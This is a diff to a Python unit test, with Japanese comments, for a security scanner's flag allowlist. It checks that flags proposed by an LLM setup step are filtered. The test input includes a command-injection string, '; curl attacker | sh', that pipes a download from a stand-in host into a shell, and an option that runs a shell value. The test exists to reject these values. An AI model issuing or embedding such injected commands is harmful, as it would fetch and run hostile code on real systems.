@@ -63,10 +63,10 @@ def test_flags_allowlist_only_safe_toggles():
     # 注入・値がシェル実行される option・任意の値付き option を排除（#170 P2）。
     out = _parse_setup_llm(
         '{"checks": ["os"], "flags": ["; curl attacker | sh", "--dom-xss", '
-        '"--header-refresh-cmd=id", "--llm=claude", "--no-headless", "--spa-crawl"]}',
+        '"--header-refresh-cmd=id", "--llm=claude", "--no-headless", "--fast", "--spa-crawl"]}',
         KNOWN,
     )
-    # 許可リスト外（注入/値付き/scan に無い --no-headless）は全て落とす
+    # 許可リスト外（注入/値付き/scan に無い --no-headless/depth と食い違う --fast）は全て落とす
     assert out["flags"] == ["--dom-xss", "--spa-crawl"]
 
 
